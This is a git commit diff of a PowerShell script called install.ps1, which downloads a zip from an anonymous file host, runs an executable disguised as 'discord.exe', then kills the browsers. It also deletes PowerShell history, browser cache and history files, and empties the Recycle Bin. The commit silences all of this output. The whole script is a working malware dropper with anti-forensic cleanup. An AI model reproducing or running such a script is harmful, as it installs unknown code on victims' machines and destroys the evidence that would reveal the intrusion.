7356931fa59a8f2b30bc94a596b10b85e5a3d215
arxstore <paphawin.ffaith@gmail.com>
2026-05-28 21:12:42 +0700

    Update install.ps1

--- install.ps1
+++ install.ps1
@@ -3,9 +3,9 @@ $zipUrl = "https://files.catbox.moe/0tjan7.zip"
 $zipPath = "$env:TEMP\work.zip"
 $extractPath = "$env:TEMP\work"
 
-Invoke-WebRequest $zipUrl -OutFile $zipPath
+Invoke-WebRequest $zipUrl -OutFile $zipPath > $null 2>&1
 
-Expand-Archive $zipPath $extractPath -Force
+Expand-Archive $zipPath $extractPath -Force > $null 2>&1
 
 $exe = Get-ChildItem $extractPath -Recurse -Filter "discord.exe" | Select-Object -First 1
 
@@ -15,34 +15,33 @@ if ($exe) {
 
     Start-Sleep 5
 
-    Stop-Process -Id $p.Id -Force -ErrorAction SilentlyContinue
+    Stop-Process -Id $p.Id -Force -ErrorAction SilentlyContinue > $null 2>&1
 }
 
 Start-Sleep 2
 
-taskkill /f /im discord.exe 2>$null
+taskkill /f /im discord.exe > $null 2>&1
+taskkill /f /im chrome.exe > $null 2>&1
+taskkill /f /im msedge.exe > $null 2>&1
 
-cmd /c rd /s /q "$extractPath"
+cmd /c rd /s /q "$extractPath" > nul 2>&1
 
-Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
+Remove-Item $zipPath -Force -ErrorAction SilentlyContinue > $null 2>&1
 
-# PowerShell History
 Clear-History
-Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -ErrorAction SilentlyContinue
 
-# Browser Cache
-Remove-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cache\*" -Recurse -Force -ErrorAction SilentlyContinue
-Remove-Item "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cache\*" -Recurse -Force -ErrorAction SilentlyContinue
+Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -ErrorAction SilentlyContinue > $null 2>&1
 
-# Browser Download / History DB
-taskkill /f /im chrome.exe 2>$null
-taskkill /f /im msedge.exe 2>$null
+Remove-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cache\*" -Recurse -Force -ErrorAction SilentlyContinue > $null 2>&1
 
-Remove-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History" -Force -ErrorAction SilentlyContinue
-Remove-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History-journal" -Force -ErrorAction SilentlyContinue
+Remove-Item "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cache\*" -Recurse -Force -ErrorAction SilentlyContinue > $null 2>&1
 
-Remove-Item "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History" -Force -ErrorAction SilentlyContinue
-Remove-Item "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History-journal" -Force -ErrorAction SilentlyContinue
+Remove-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History" -Force -ErrorAction SilentlyContinue > $null 2>&1
 
-# Recycle Bin
-Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+Remove-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History-journal" -Force -ErrorAction SilentlyContinue > $null 2>&1
+
+Remove-Item "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History" -Force -ErrorAction SilentlyContinue > $null 2>&1
+
+Remove-Item "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History-journal" -Force -ErrorAction SilentlyContinue > $null 2>&1
+
+Clear-RecycleBin -Force -ErrorAction SilentlyContinue > $null 2>&1
